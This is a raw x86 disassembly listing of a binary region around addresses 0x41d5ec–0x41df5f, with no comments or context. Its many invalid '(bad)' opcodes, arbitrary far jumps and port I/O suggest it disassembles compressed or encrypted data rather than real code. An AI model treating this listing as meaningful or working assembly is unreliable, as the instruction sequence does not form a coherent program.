  41d5ec:	xchg   edi,eax
  41d5ed:	repnz inc ebp
  41d5ef:	jne    0x41d588
  41d5f1:	cmp    al,0x3
  41d5f3:	cs mov esi,0x758708c7
  41d5f9:	adc    esi,DWORD PTR [ebx-0x5ae4f9e6]
  41d5ff:	ret    
  41d600:	pop    esp
  41d601:	sub    dl,BYTE PTR [si+0x3a]
  41d605:	push   edx
  41d606:	jle    0x41d58a
  41d608:	sub    al,0x5d
  41d60a:	rcl    DWORD PTR ds:0x31af9739,cl
  41d610:	ror    BYTE PTR [ebx-0x21],0x36
  41d614:	adc    DWORD PTR [eax-0xbf1e0ec],0xdd32cc11
  41d61e:	je     0x41d64a
  41d620:	ja     0x41d68b
  41d622:	(bad)  
  41d624:	into   
  41d625:	mov    edi,0xe34f35a0
  41d62a:	int3   
  41d62b:	rcr    ah,1
  41d62d:	adc    DWORD PTR [edi+0x28d2f06b],edi
  41d633:	loope  0x41d68c
  41d635:	adc    DWORD PTR [ecx],esp
  41d637:	xlat   BYTE PTR ds:[ebx]
  41d638:	mov    WORD PTR [edi+0x51],es
  41d63b:	mov    ?,WORD PTR [ebp+ecx*4-0x16]
  41d63f:	add    DWORD PTR [esi-0x63240d38],ebp
  41d645:	pop    edx
  41d646:	out    dx,al
  41d647:	lods   al,BYTE PTR ds:[si]
  41d649:	jmp    0xeb56:0x4e1abb03
  41d650:	idiv   DWORD PTR [edi-0x62]
  41d653:	sub    BYTE PTR [ebx+ebp*1+0x3160ac59],0xaf
  41d65b:	sahf   
  41d65c:	popf   
  41d65d:	pop    ecx
  41d65e:	fisubr WORD PTR [ecx+0xa]
  41d661:	fistp  DWORD PTR [edx+0x3a]
  41d664:	cmp    al,0x3d
  41d666:	xor    BYTE PTR [ecx],al
  41d668:	aam    0xfe
  41d66a:	data16 sub al,0xb2
  41d66d:	outs   dx,DWORD PTR ds:[esi]
  41d66e:	aad    0xe
  41d670:	stc    
  41d671:	sbb    edi,DWORD PTR [ebx+eiz*4-0x48557558]
  41d678:	mov    al,ds:0x1ddcd080
  41d67d:	fsubp  st(6),st
  41d67f:	push   ecx
  41d680:	jecxz  0x41d658
  41d682:	jg     0x41d6fd
  41d684:	jo     0x41d621
  41d686:	in     eax,dx
  41d687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d688:	(bad)  
  41d689:	jle    0x41d6de
  41d68b:	dec    ebx
  41d68c:	frstor [ebx]
  41d68e:	mov    esp,0x6556c97
  41d693:	add    al,0xe5
  41d695:	sub    BYTE PTR [edx],al
  41d697:	inc    ebp
  41d698:	imul   DWORD PTR [edx-0x21]
  41d69b:	dec    ebp
  41d69c:	bound  esp,QWORD PTR [eax]
  41d69e:	cmp    DWORD PTR [edx],0xbcb77793
  41d6a4:	xor    DWORD PTR [ecx],0xc5b20799
  41d6aa:	in     al,dx
  41d6ab:	repz pop ss
  41d6ad:	test   edx,eax
  41d6af:	cmp    edx,DWORD PTR [esi+0xe]
  41d6b2:	loop   0x41d6da
  41d6b4:	idiv   DWORD PTR [ebx+0x1b]
  41d6b7:	push   ebx
  41d6b8:	or     BYTE PTR [ebx-0x1c],ch
  41d6bb:	jno    0x41d6fb
  41d6bd:	push   esp
  41d6be:	outs   dx,DWORD PTR ds:[esi]
  41d6bf:	out    0xe1,al
  41d6c1:	adc    BYTE PTR [ebp-0x10b9feb4],dh
  41d6c7:	mov    eax,0x60901731
  41d6cc:	mov    ebx,0xa300b3b5
  41d6d1:	add    eax,0xf7dde9ce
  41d6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d7:	adc    BYTE PTR [eax+0x67],0x20
  41d6db:	inc    ebp
  41d6dc:	inc    edi
  41d6dd:	mov    eax,ds:0x8b55dd44
  41d6e2:	fld    QWORD PTR [ebx-0x7d69d4ce]
  41d6e8:	call   0x10dffaf5
  41d6ed:	int3   
  41d6ee:	mul    ebp
  41d6f0:	(bad)  
  41d6f1:	jo     0x41d709
  41d6f3:	arpl   WORD PTR [ebx-0x10],bx
  41d6f6:	sbb    al,0xe
  41d6f8:	xor    dl,bh
  41d6fa:	fwait
  41d6fb:	xor    eax,0xf122fcac
  41d700:	arpl   cx,di
  41d702:	iret   
  41d703:	dec    ebp
  41d704:	stos   BYTE PTR es:[edi],al
  41d705:	es aam 0xe2
  41d708:	addr16 addr16 mov ah,0xad
  41d70c:	push   esp
  41d70d:	push   ss
  41d70e:	mov    esi,0xd4b3da93
  41d713:	popa   
  41d714:	(bad)  
  41d716:	add    ch,BYTE PTR [ecx]
  41d718:	fwait
  41d719:	mov    ebx,0x12a69523
  41d71e:	nop
  41d71f:	sub    eax,0xfd7a7f99
  41d724:	xor    al,0xf9
  41d726:	lahf   
  41d727:	aas    
  41d728:	sbb    eax,0x165b4bef
  41d72d:	aaa    
  41d72e:	sbb    eax,DWORD PTR [edi+eax*1+0x31bfefe4]
  41d735:	imul   esp,esi,0x8e328f12
  41d73b:	bound  ebx,QWORD PTR [ebx-0x198377e9]
  41d741:	aad    0x2b
  41d743:	popf   
  41d744:	adc    esp,DWORD PTR [edx]
  41d746:	dec    esi
  41d747:	xchg   ecx,eax
  41d748:	dec    edi
  41d749:	(bad)  [ecx+0x5a]
  41d74c:	dec    esp
  41d74d:	push   0xd52eb89
  41d752:	or     BYTE PTR [edx],al
  41d754:	sub    edx,esp
  41d756:	or     BYTE PTR [ebp+0x4165c287],cl
  41d75c:	xlat   BYTE PTR ds:[ebx]
  41d75d:	mov    ds:0x8ea21931,al
  41d762:	jl     0x41d760
  41d764:	bound  edi,QWORD PTR [ecx+0x2633ec01]
  41d76a:	jae    0x41d7d6
  41d76c:	ins    BYTE PTR es:[edi],dx
  41d76d:	adc    cl,BYTE PTR [ebx]
  41d76f:	xchg   esi,eax
  41d770:	shr    ecx,cl
  41d772:	push   ecx
  41d773:	stc    
  41d774:	dec    sp
  41d776:	and    eax,ecx
  41d778:	fist   DWORD PTR [edx]
  41d77a:	pop    edi
  41d77b:	jmp    0x41d795
  41d77d:	pop    ss
  41d77e:	or     eax,0x2a36f1a2
  41d783:	add    eax,0xbb39e16f
  41d788:	in     al,0x9e
  41d78a:	nop
  41d78b:	cmp    DWORD PTR [ebx+edx*8],0xffffff90
  41d78f:	add    eax,0x5da1f9fb
  41d794:	dec    ebp
  41d795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d796:	cmp    al,0x65
  41d798:	pop    ecx
  41d799:	push   edi
  41d79a:	out    dx,eax
  41d79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d79c:	ss ret 
  41d79e:	fst    DWORD PTR ds:0xd6ab01ca
  41d7a4:	add    BYTE PTR [edx-0x5858ad0c],cl
  41d7aa:	ret    0x9db3
  41d7ad:	mov    DWORD PTR [edx-0x275f82a2],ecx
  41d7b3:	lods   al,BYTE PTR ds:[esi]
  41d7b4:	dec    ecx
  41d7b5:	clc    
  41d7b6:	push   es
  41d7b7:	dec    edx
  41d7b8:	and    BYTE PTR [edx+0xe8e1263],dh
  41d7be:	cmp    eax,0x4b800921
  41d7c3:	outs   dx,DWORD PTR ds:[esi]
  41d7c4:	add    DWORD PTR [ecx-0x81d3824],0xd34ea1ea
  41d7ce:	sbb    BYTE PTR [eax-0x11861775],ch
  41d7d4:	dec    ebx
  41d7d5:	xor    bh,BYTE PTR [ebx+0x3a]
  41d7d8:	inc    eax
  41d7d9:	xlat   BYTE PTR ds:[ebx]
  41d7da:	dec    esi
  41d7db:	push   0x719becc1
  41d7e0:	xor    al,0x52
  41d7e2:	out    dx,eax
  41d7e3:	xchg   DWORD PTR [edi-0x63],esp
  41d7e6:	jecxz  0x41d819
  41d7e8:	fwait
  41d7e9:	mov    esi,0x8ed41542
  41d7ee:	test   eax,0x99044362
  41d7f3:	sub    cl,dh
  41d7f5:	xchg   bh,bl
  41d7f7:	cmp    DWORD PTR [ebx-0x71090127],ebp
  41d7fd:	sti    
  41d7fe:	xor    BYTE PTR [eax+0x674182e4],ah
  41d804:	mov    eax,0x555bad2a
  41d809:	pop    esi
  41d80a:	aaa    
  41d80b:	push   edi
  41d80c:	mov    ?,WORD PTR [esi-0x4a]
  41d80f:	push   esi
  41d810:	xchg   ecx,eax
  41d811:	lock push ss
  41d813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d814:	and    ebx,0x3987e9f4
  41d81a:	adc    eax,0x1538d1
  41d81f:	rcl    DWORD PTR [edx-0x53],1
  41d822:	mov    eax,0x8b23f9e5
  41d827:	retf   0x2f88
  41d82a:	inc    edx
  41d82b:	pop    edx
  41d82c:	loopne 0x41d86a
  41d82e:	inc    edi
  41d82f:	loopne 0x41d80e
  41d831:	js     0x41d86c
  41d833:	sub    bh,bl
  41d835:	adc    ebp,ebp
  41d837:	mov    ecx,0xfa52f0ba
  41d83c:	sub    bl,cl
  41d83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d83f:	aam    0x38
  41d841:	sub    DWORD PTR ds:0x827d52c8,0xffffffae
  41d848:	and    ecx,esp
  41d84a:	idiv   DWORD PTR [edx-0x52]
  41d84d:	out    dx,al
  41d84e:	or     DWORD PTR [edx+0x5f512c73],ecx
  41d854:	dec    eax
  41d855:	or     eax,0xa52c3a3c
  41d85a:	fwait
  41d85b:	jle    0x41d7e4
  41d85d:	pop    ecx
  41d85e:	mov    ds:0x2fe6955a,eax
  41d863:	sub    DWORD PTR [edx+0x44],0x52
  41d867:	mov    gs,WORD PTR [edi-0x71]
  41d86a:	pop    esp
  41d86b:	je     0x41d836
  41d86d:	sub    dl,BYTE PTR [ebp-0x7af761d0]
  41d873:	add    ebp,ebx
  41d875:	sub    BYTE PTR [ebx+0x583fe7b6],bl
  41d87b:	xlat   BYTE PTR ds:[ebx]
  41d87c:	xchg   ebp,eax
  41d87d:	xchg   edx,eax
  41d87e:	dec    esi
  41d87f:	add    BYTE PTR [ebx-0x61794f93],ah
  41d885:	mov    dh,0x51
  41d887:	push   cs
  41d888:	clc    
  41d889:	inc    esi
  41d88a:	(bad)  
  41d88b:	aas    
  41d88c:	xchg   esi,eax
  41d88d:	or     dl,BYTE PTR [ecx+0x1c133ddc]
  41d893:	addr16 js 0x41d82d
  41d896:	pushf  
  41d897:	fidiv  DWORD PTR [esi]
  41d899:	pusha  
  41d89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d89b:	mov    bh,0xfe
  41d89d:	cmp    DWORD PTR [ebx],0xffffffb0
  41d8a0:	gs cmp ch,0xf2
  41d8a4:	and    dh,ch
  41d8a6:	or     BYTE PTR [ebp-0x1f49696d],0x65
  41d8ad:	(bad)  
  41d8ae:	int3   
  41d8af:	sahf   
  41d8b0:	cmc    
  41d8b1:	push   ss
  41d8b2:	mov    DWORD PTR [eax],ebx
  41d8b4:	rol    DWORD PTR [edx-0xc],0xc7
  41d8b8:	mov    dl,0xbb
  41d8ba:	loopne 0x41d8b5
  41d8bc:	fwait
  41d8bd:	in     eax,dx
  41d8be:	inc    ecx
  41d8bf:	jmp    0x41d8d7
  41d8c1:	and    al,0xc5
  41d8c3:	leave  
  41d8c4:	in     al,dx
  41d8c5:	outs   dx,BYTE PTR ds:[esi]
  41d8c6:	mov    ebp,0xa7c87d50
  41d8cb:	dec    edx
  41d8cc:	outs   dx,BYTE PTR ds:[esi]
  41d8cd:	cmp    al,0x41
  41d8cf:	idiv   DWORD PTR [ecx]
  41d8d1:	adc    eax,0x1f31321f
  41d8d6:	adc    DWORD PTR [ecx-0x71b92ad],esp
  41d8dc:	out    dx,al
  41d8dd:	jge    0x41d863
  41d8df:	daa    
  41d8e0:	sub    bh,dh
  41d8e2:	test   BYTE PTR [ebx],bl
  41d8e4:	sti    
  41d8e5:	mov    bh,0xe9
  41d8e7:	popa   
  41d8e8:	ja     0x41d913
  41d8ea:	fxtract 
  41d8ec:	out    dx,al
  41d8ed:	out    0x32,al
  41d8ef:	sar    bh,1
  41d8f1:	dec    esp
  41d8f2:	dec    ebp
  41d8f3:	sar    DWORD PTR [edi],cl
  41d8f5:	addr16 mov ch,0xba
  41d8f8:	dec    ebx
  41d8f9:	dec    ebp
  41d8fa:	fdivr  st(0),st
  41d8fc:	adc    DWORD PTR [edx+0x79],esi
  41d8ff:	out    0x61,al
  41d901:	jecxz  0x41d96e
  41d903:	mov    BYTE PTR [ebx+ecx*8+0x35],0x69
  41d908:	dec    esi
  41d909:	fdivr  QWORD PTR [eax-0x6a3cecea]
  41d90f:	dec    ecx
  41d910:	mov    eax,0xa6409b58
  41d915:	ins    BYTE PTR es:[edi],dx
  41d916:	mov    ds:0xfa67a0b7,eax
  41d91b:	sub    ebx,0x85831128
  41d921:	adc    esi,DWORD PTR [eax-0x245ccdc1]
  41d927:	inc    esp
  41d928:	dec    edi
  41d929:	pop    edi
  41d92a:	mov    DWORD PTR [eax+0x23408fe5],ebp
  41d930:	lds    esp,FWORD PTR [esi+0x16]
  41d933:	ja     0x41d994
  41d935:	xchg   esi,eax
  41d936:	fwait
  41d937:	jnp    0x41d940
  41d939:	xor    DWORD PTR [ebp+0x201f7165],0xd92de5e3
  41d943:	push   edx
  41d944:	jb     0x41d92f
  41d946:	fcomp  DWORD PTR [esi+ebp*1]
  41d949:	ucomiss xmm3,DWORD PTR [esi]
  41d94c:	cmp    DWORD PTR [edx+0x3badc844],ecx
  41d952:	adc    DWORD PTR gs:[eax],ecx
  41d955:	in     al,dx
  41d956:	mov    BYTE PTR [ebp+0x0],cl
	...
  41db29:	add    BYTE PTR [eax],al
  41db2b:	add    BYTE PTR [esi],cl
  41db2d:	pop    esp
  41db2e:	mov    esp,0xffe7fe47
  41db33:	pop    ebp
  41db34:	es mov eax,0x87a5fe17
  41db3a:	clc    
  41db3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db3c:	daa    
  41db3d:	fild   DWORD PTR [ecx]
  41db3f:	add    BYTE PTR [edx],ah
  41db41:	pop    es
  41db42:	add    BYTE PTR [eax],al
  41db44:	dec    eax
  41db45:	fld    QWORD PTR [edx+eax*4+0x63]
  41db49:	mov    ds:0x1276cd6c,al
  41db4e:	pop    esi
  41db4f:	jmp    FWORD PTR [esi+0x22]
  41db52:	in     eax,0x7a
  41db54:	mov    ds:0x9883be56,al
  41db59:	test   BYTE PTR [eax+esi*1+0x1b],0x76
  41db5e:	fcom   QWORD PTR [esp+eiz*2+0x4]
  41db62:	(bad)  
  41db63:	pop    esp
  41db64:	mov    ch,0xa
  41db66:	adc    DWORD PTR [edi-0x6eb6c5f6],esi
  41db6c:	and    BYTE PTR [ecx-0x7c],0x73
  41db70:	clc    
  41db71:	jno    0x41db0b
  41db73:	sbb    bl,bh
  41db75:	pushf  
  41db76:	cli    
  41db77:	pop    ebx
  41db78:	outs   dx,BYTE PTR ds:[esi]
  41db79:	pop    edi
  41db7a:	outs   dx,DWORD PTR ds:[esi]
  41db7b:	std    
  41db7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db7d:	pop    esi
  41db7e:	inc    ecx
  41db7f:	xor    ah,BYTE PTR [ebx+0x1c79bca1]
  41db85:	mov    ecx,0x3af491ed
  41db8b:	pop    ebp
  41db8c:	mov    eax,0xea557f7
  41db91:	xlat   BYTE PTR ds:[ebx]
  41db92:	add    BYTE PTR [eax-0x30],ah
  41db95:	push   edi
  41db96:	aad    0xa6
  41db98:	pop    esp
  41db99:	loop   0x41db6f
  41db9b:	and    BYTE PTR [ebp-0x3b],dh
  41db9e:	xor    eax,0x1a2e14ad
  41dba3:	mov    ebp,0xbf9bbac9
  41dba8:	mul    cl
  41dbaa:	or     BYTE PTR [edi+0x23],al
  41dbad:	xchg   edx,eax
  41dbae:	mov    eax,ds:0x43076c6b
  41dbb3:	movzx  ecx,al
  41dbb6:	add    al,0x45
  41dbb8:	in     al,dx
  41dbb9:	sub    al,0xae
  41dbbb:	jmp    0x62406c8e
  41dbc0:	xchg   edx,eax
  41dbc1:	xchg   ecx,eax
  41dbc2:	mov    esp,0xb678614b
  41dbc7:	(bad)  
  41dbc8:	push   ebx
  41dbc9:	sbb    edi,DWORD PTR [edi-0x2d54b5a5]
  41dbcf:	xor    esi,DWORD PTR [ebx-0x438918ee]
  41dbd5:	aam    0x80
  41dbd7:	mov    dh,0x78
  41dbd9:	pop    ds
  41dbda:	ins    BYTE PTR es:[edi],dx
  41dbdb:	sub    DWORD PTR [ecx-0x30189f3c],eax
  41dbe1:	mov    dl,BYTE PTR [edi+0x22352145]
  41dbe7:	inc    eax
  41dbe8:	xchg   edi,eax
  41dbe9:	mov    ds:0x65d00b90,eax
  41dbee:	jo     0x41dbba
  41dbf0:	sub    eax,0xfc402e3
  41dbf5:	fs mov eax,0x8ac7821c
  41dbfb:	repnz sbb al,0xa8
  41dbfe:	or     dl,cl
  41dc00:	or     cl,BYTE PTR [eax+0x0]
  41dc03:	bnd ja 0x41db86
  41dc06:	adc    esp,DWORD PTR [eax]
  41dc08:	out    dx,al
  41dc09:	mov    edi,0x2e4a6001
  41dc0e:	mov    bh,0x8f
  41dc10:	mov    bl,0x6c
  41dc12:	mov    ebp,0x440d0c51
  41dc17:	aas    
  41dc18:	test   DWORD PTR [eax+0x3c],ebp
  41dc1b:	clc    
  41dc1c:	retf   0x6941
  41dc1f:	jp     0x41dc54
  41dc21:	mov    BYTE PTR [edi-0x11801aa0],al
  41dc27:	xor    dl,bl
  41dc29:	popa   
  41dc2a:	mov    BYTE PTR [eax+0x38],cl
  41dc2d:	aad    0xa1
  41dc2f:	mov    gs,esi
  41dc31:	jns    0x41dc25
  41dc33:	rcr    DWORD PTR [ebp-0x45],cl
  41dc36:	mov    dh,0x86
  41dc38:	cld    
  41dc39:	lahf   
  41dc3a:	adc    ebp,ecx
  41dc3c:	mov    dh,0xb2
  41dc3e:	cmp    BYTE PTR [edi+0x475fe083],bl
  41dc44:	cmp    dh,bh
  41dc46:	mov    ah,0xda
  41dc48:	pop    es
  41dc49:	pop    esp
  41dc4a:	mov    edx,0xa5509fd8
  41dc4f:	imul   ebx,DWORD PTR [edx-0x54d48b01],0xffffffcc
  41dc56:	leave  
  41dc57:	jb     0x41dc9c
  41dc59:	xchg   ecx,eax
  41dc5a:	repz pop ebx
  41dc5c:	mov    edx,0xe6725bdb
  41dc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc62:	ret    
  41dc63:	cmp    al,0x5b
  41dc65:	mov    ds:0x4cb5b0c2,eax
  41dc6a:	ins    DWORD PTR es:[edi],dx
  41dc6b:	retf   
  41dc6c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41dc6e:	call   0xd4c7ff69
  41dc73:	jecxz  0x41dc28
  41dc75:	mov    esi,0x29d651b5
  41dc7a:	xchg   esp,eax
  41dc7b:	add    DWORD PTR [edi-0x6a60f639],edx
  41dc81:	fbstp  TBYTE PTR [edx]
  41dc83:	dec    eax
  41dc84:	dec    edx
  41dc85:	jae    0x41dc9b
  41dc87:	push   esp
  41dc88:	cmp    eax,0xfa33a33
  41dc8d:	lea    esp,[eax+0x30]
  41dc90:	xchg   esi,eax
  41dc91:	and    DWORD PTR [ebx+0x2cfbeddd],esi
  41dc97:	sbb    DWORD PTR [ebp+ebp*1-0x33],0xffffffc0
  41dc9c:	jle    0x41dc2e
  41dc9e:	add    al,0xd
  41dca0:	scas   eax,DWORD PTR es:[edi]
  41dca1:	mov    ds:0xf2753d57,al
  41dca6:	lock mov ah,0x59
  41dca9:	pop    edi
  41dcaa:	jle    0x41dcd7
  41dcac:	aam    0x46
  41dcae:	mov    ?,WORD PTR [edi+0x18d4e381]
  41dcb4:	push   eax
  41dcb5:	ins    BYTE PTR es:[edi],dx
  41dcb6:	test   BYTE PTR [edx+0x1d50c30b],bh
  41dcbc:	adc    DWORD PTR [ebp-0x3f6ac0ec],esp
  41dcc2:	fisttp WORD PTR [ebx-0x3]
  41dcc5:	stos   DWORD PTR es:[edi],eax
  41dcc6:	sti    
  41dcc7:	pop    esi
  41dcc8:	popf   
  41dcc9:	pop    edi
  41dcca:	push   ecx
  41dccb:	cmp    eax,0x75afe80d
  41dcd0:	loope  0x41dc5c
  41dcd2:	pop    ecx
  41dcd3:	dec    ebx
  41dcd4:	sub    eax,0x59e647ba
  41dcd9:	(bad)
  41dcdc:	mov    bh,ch
  41dcde:	out    dx,eax
  41dcdf:	pop    esi
  41dce0:	in     al,dx
  41dce1:	(bad)  
  41dce2:	or     DWORD PTR [edx-0x24],ebp
  41dce5:	jp     0x41dcf4
  41dce7:	or     DWORD PTR [edx-0x4d],edx
  41dcea:	jae    0x41dd17
  41dcec:	in     eax,dx
  41dced:	adc    dh,ch
  41dcef:	push   cs
  41dcf0:	add    ch,BYTE PTR [esp+esi*1+0x3a8e649c]
  41dcf7:	jb     0x41dc91
  41dcf9:	cmc    
  41dcfa:	pop    eax
  41dcfb:	addr16 mov ebx,0x74f3a163
  41dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd02:	call   0x22bd:0x13435b24
  41dd09:	pop    eax
  41dd0a:	pop    ss
  41dd0b:	mov    WORD PTR [edx-0x4023422e],gs
  41dd11:	xor    al,0xac
  41dd13:	mov    ds:0x7631e7ce,al
  41dd18:	ins    BYTE PTR es:[edi],dx
  41dd19:	sub    bh,dh
  41dd1b:	cdq    
  41dd1c:	jns    0x41dd03
  41dd1e:	mov    cs,eax
  41dd20:	adc    al,0xc4
  41dd22:	adc    al,0x5e
  41dd24:	fldcw  WORD PTR [ebx+edi*2+0x7b]
  41dd28:	pop    ebx
  41dd29:	pop    ebx
  41dd2a:	adc    al,0xec
  41dd2c:	lock hlt 
  41dd2e:	jne    0x41dd37
  41dd30:	aad    0x8
  41dd32:	dec    ebx
  41dd33:	pop    ebp
  41dd34:	mov    ebp,0xb8f32dd9
  41dd39:	or     ah,cl
  41dd3b:	lock test eax,0x8ced3b80
  41dd41:	fisttp DWORD PTR [ebp+ebx*1-0x339a32e]
  41dd48:	ds mov edi,0x6f796557
  41dd4e:	and    dh,0x41
  41dd51:	(bad)  
  41dd53:	dec    edx
  41dd54:	imul   eax,ebx,0xb206ffb8
  41dd5a:	iret   
  41dd5b:	sub    DWORD PTR [esi-0x15],eax
  41dd5e:	mov    ds:0x6614fa00,al
  41dd63:	mov    dh,BYTE PTR [edx+0x70388654]
  41dd69:	fcomp  QWORD PTR [ebx-0x73019bce]
  41dd6f:	jl     0x41ddc7
  41dd71:	cmp    BYTE PTR [ecx+0xf],bh
  41dd74:	pop    edx
  41dd75:	addr16 popf 
  41dd77:	xor    eax,0xdf69079f
  41dd7c:	enter  0xf855,0x7d
  41dd80:	int    0x30
  41dd82:	xchg   DWORD PTR [edi-0x7d0158c7],esi
  41dd88:	push   esi
  41dd89:	ret    0x4090
  41dd8c:	jae    0x41dd66
  41dd8e:	bound  ecx,QWORD PTR [edi+eax*2-0x61433c95]
  41dd95:	and    BYTE PTR [eax+edi*4],0x88
  41dd99:	or     DWORD PTR [ebx],edi
  41dd9b:	pop    esi
  41dd9c:	dec    eax
  41dd9d:	cmc    
  41dd9e:	sub    al,0xb8
  41dda0:	inc    esp
  41dda1:	stc    
  41dda2:	mov    al,0xab
  41dda4:	sub    BYTE PTR [esi],cl
  41dda6:	stos   DWORD PTR es:[edi],eax
  41dda7:	mov    cl,0xe5
  41dda9:	call   0xf09da934
  41ddae:	sub    bh,BYTE PTR [edi-0x329345fa]
  41ddb4:	and    DWORD PTR [ebp+eiz*1+0x13],ebx
  41ddb8:	jne    0x41dd96
  41ddba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddbb:	neg    DWORD PTR [ebx]
  41ddbd:	inc    edi
  41ddbe:	and    al,0x71
  41ddc0:	and    DWORD PTR [edi],ebx
  41ddc2:	adc    eax,0xc70e2c4e
  41ddc7:	jle    0x41dd8d
  41ddc9:	imul   edi,DWORD PTR [edx-0x5be6c133],0xffffffd5
  41ddd0:	call   0xa0d9:0x37b3860e
  41ddd7:	or     eax,0xa7806017
  41dddc:	adc    dh,BYTE PTR [ebx-0x53]
  41dddf:	into   
  41dde0:	pop    edx
  41dde1:	fild   QWORD PTR [edx-0x30]
  41dde4:	ss scas al,BYTE PTR es:[edi]
  41dde6:	mov    ecx,0x45e0dca
  41ddeb:	ja     0x41de66
  41dded:	mov    ss,WORD PTR [esi+0x30]
  41ddf0:	jae    0x41ddfc
  41ddf2:	test   BYTE PTR [edi+0x3cf3aafd],al
  41ddf8:	add    ebx,DWORD PTR [esi+0x27]
  41ddfb:	push   ebp
  41ddfc:	xchg   edx,eax
  41ddfd:	fidivr WORD PTR [eax+ebp*4-0x8]
  41de01:	adc    edx,eax
  41de03:	push   es
  41de04:	call   0xc1be:0xdbd3e8b0
  41de0b:	push   ebp
  41de0c:	(bad)  
  41de0d:	das    
  41de0e:	ret    
  41de0f:	retf   
  41de10:	sbb    eax,0x99ba6c09
  41de15:	mov    al,0x81
  41de17:	adc    eax,eax
  41de19:	xchg   edx,eax
  41de1a:	in     eax,0x2e
  41de1c:	test   al,0xc8
  41de1e:	jge    0x41de9e
  41de20:	xchg   esp,eax
  41de21:	mov    bh,0xc5
  41de23:	cmc    
  41de24:	das    
  41de25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de26:	dec    edi
  41de27:	js     0x41dea3
  41de29:	and    DWORD PTR [esi+edx*8+0x5a5c4b11],eax
  41de30:	dec    eax
  41de31:	mov    ecx,0x1d210cf1
  41de36:	pop    edx
  41de37:	int    0x5b
  41de39:	inc    edx
  41de3a:	loope  0x41de07
  41de3c:	jmp    0x8f90:0x1817cc32
  41de43:	mov    eax,ds:0x89df4d62
  41de48:	loop   0x41de35
  41de4a:	cwde   
  41de4b:	clc    
  41de4c:	jne    0x41de42
  41de4e:	xchg   esi,eax
  41de4f:	and    BYTE PTR [edx-0x213fe57f],dh
  41de55:	sub    al,0xf3
  41de57:	xor    BYTE PTR [esi-0x5eddb442],0x62
  41de5e:	or     ebx,ebx
  41de60:	push   edx
  41de61:	add    eax,0x3d14a56a
  41de66:	push   eax
  41de67:	dec    edx
  41de68:	jl     0x41de24
  41de6a:	jbe    0x41de34
  41de6c:	out    0x41,eax
  41de6e:	sub    BYTE PTR [edx],0xd9
  41de71:	outs   dx,DWORD PTR ds:[esi]
  41de72:	in     eax,dx
  41de73:	aam    0xe6
  41de75:	outs   dx,DWORD PTR ds:[esi]
  41de76:	vpsubq ymm1,ymm3,YMMWORD PTR [ebp+0x44]
  41de7b:	hlt    
  41de7c:	pop    DWORD PTR [esi-0x4ac198ea]
  41de82:	cs jle 0x41dee0
  41de85:	pop    eax
  41de86:	rcr    DWORD PTR [ecx-0x35],cl
  41de89:	sub    eax,DWORD PTR ds:0x7a0f2bdc
  41de8f:	(bad)  
  41de90:	fnstcw WORD PTR [ebx]
  41de92:	mov    bl,BYTE PTR [ebx+0x78a55150]
  41de98:	mov    cl,BYTE PTR [edx+0x199f79]
  41de9e:	and    DWORD PTR [edx+eax*4+0xc],ebp
  41dea2:	inc    edx
  41dea3:	aad    0x61
  41dea5:	xor    esi,DWORD PTR [edi-0x48]
  41dea8:	into   
  41dea9:	or     eax,0x699b0d60
  41deae:	call   0xd190:0xe6e8bead
  41deb5:	leave  
  41deb6:	or     eax,0x8726449d
  41debb:	or     eax,0x7955cd2c
  41dec0:	sbb    esp,DWORD PTR [edi]
  41dec2:	add    DWORD PTR [edi],0x8
  41dec5:	sbb    dh,dl
  41dec7:	xchg   ecx,eax
  41dec8:	test   BYTE PTR [edi],0xf9
  41decb:	in     al,0x5b
  41decd:	idiv   DWORD PTR [ecx]
  41decf:	pusha  
  41ded0:	clc    
  41ded1:	jle    0x41df36
  41ded3:	pushf  
  41ded4:	ds in  eax,dx
  41ded6:	pop    ecx
  41ded7:	mov    eax,0x6bed5c81
  41dedc:	lahf   
  41dedd:	sahf   
  41dede:	pop    ax
  41dee0:	lahf   
  41dee1:	clc    
  41dee2:	cld    
  41dee3:	xchg   esp,eax
  41dee4:	stc    
  41dee5:	scas   eax,DWORD PTR es:[edi]
  41dee6:	push   es
  41dee7:	or     ecx,DWORD PTR [esi+0x4f207d09]
  41deed:	popf   
  41deee:	pop    ebp
  41deef:	xchg   ebp,eax
  41def0:	mov    ah,BYTE PTR [ecx-0x24]
  41def3:	cmp    eax,DWORD PTR [ebp+0x18e03fbd]
  41def9:	lock cmp al,0x62
  41defc:	je     0x41de95
  41defe:	fwait
  41deff:	daa    
  41df00:	add    DWORD PTR [edi+0x2997fdc8],eax
  41df06:	xchg   edx,eax
  41df07:	mov    ds:0x91fa17f9,eax
  41df0c:	cmc    
  41df0d:	scas   al,BYTE PTR es:[edi]
  41df0e:	dec    ecx
  41df0f:	aad    0x7a
  41df11:	test   eax,0xb1575e79
  41df16:	dec    ebx
  41df17:	xor    esi,DWORD PTR [edx+0x248bd717]
  41df1d:	cmp    al,al
  41df1f:	jmp    0x258f:0x57c5a30d
  41df26:	adc    DWORD PTR [ecx+0x683ab84f],0x7d3e0a73
  41df30:	test   DWORD PTR [edx-0x425f5d02],esp
  41df36:	push   edi
  41df37:	sbb    BYTE PTR [esi+ecx*8],bl
  41df3a:	jecxz  0x41df78
  41df3c:	xor    eax,0xfec9eef6
  41df41:	mov    ds:0xed787a60,eax
  41df46:	in     al,0x2b
  41df48:	sbb    edi,DWORD PTR [ebx-0x691ad86a]
  41df4e:	mov    dl,0xd
  41df50:	ss pushf 
  41df52:	std    
  41df53:	mov    WORD PTR [eax+0x266b9dec],es
  41df59:	stos   DWORD PTR es:[edi],eax
  41df5a:	gs mov bl,0xe1
  41df5d:	sbb    al,0x36
  41df5f:	sub    eax,0xce32436c
